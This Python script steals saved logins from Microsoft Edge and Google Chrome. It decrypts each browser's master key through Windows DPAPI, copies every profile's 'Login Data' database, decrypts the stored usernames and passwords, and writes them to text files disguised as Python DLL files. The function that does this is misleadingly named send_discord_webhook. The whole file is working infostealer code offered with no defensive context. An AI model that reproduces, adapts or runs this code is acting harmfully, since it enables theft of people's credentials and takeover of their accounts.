import os;import json;import base64;import sqlite3;import shutil;from datetime import datetime, timedelta;from Crypto.Cipher import AES;import win32crypt;import requests
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception as e:
        return None
def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception as e:
            return ""
def send_discord_webhook(profile, url_info, username, password):
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    file_name = f"Python3/DLLs/Python_dll_{timestamp}.txt"
    file_path = os.path.join('.', file_name)
    
    file_content = f"\n\nProfile: {profile}\nURL: {url_info}\nUsername: {username}\nPassword: {password}\n\n"
    
    with open(file_path, 'a') as file:
        file.write(file_content)
def main():
    profiles_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data")
    profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
    all_credentials = []
    for profile in profiles:
        db_path = os.path.join(profiles_path, profile, "Login Data")
        file_name = f"ChromeData_{profile}.db"
        if not os.path.isfile(db_path):
            continue
        shutil.copyfile(db_path, file_name)
        db = sqlite3.connect(file_name)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        result = []
        for row in cursor.fetchall():
            action_url = row[1]
            username = row[2]
            password = decrypt_password_chrome(row[3], get_encryption_key())
            if username or password:
                result.append([action_url, username, password])
        cursor.close()
        db.close()
        try:
            os.remove(file_name)
        except Exception as e:
            print(f"E")
        all_credentials.extend(result)
    for credentials in all_credentials:
        url_info = credentials[0] if credentials[0] else credentials[1]
        send_discord_webhook("Edge", url_info, credentials[1], credentials[2])
def get_chrome_datetime2(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def get_encryption_key2():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception as e:
        return None
def decrypt_password_chrome2(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception as e:
            return ""
def main2():
    profiles_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
    all_credentials = []  # Liste pour stocker les informations de tous les profils

    for profile in profiles:
        db_path = os.path.join(profiles_path, profile, "Login Data")
        file_name = f"ChromeData_{profile}.db"
        if not os.path.isfile(db_path):
            continue
        shutil.copyfile(db_path, file_name)
        db = sqlite3.connect(file_name)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        result = []
        for row in cursor.fetchall():
            action_url = row[1]
            username = row[2]
            password = decrypt_password_chrome2(row[3], get_encryption_key2())
            if username or password:
                result.append([action_url, username, password])
        cursor.close()
        db.close()
        try:
            os.remove(file_name)
        except Exception as e:
            print(f"E")

        all_credentials.extend(result)

    for credentials in all_credentials:
        url_info = credentials[0] if credentials[0] else credentials[1]
        send_discord_webhook("Chrome", url_info, credentials[1], credentials[2])

if __name__ == "__main__":
    main()
    main2()
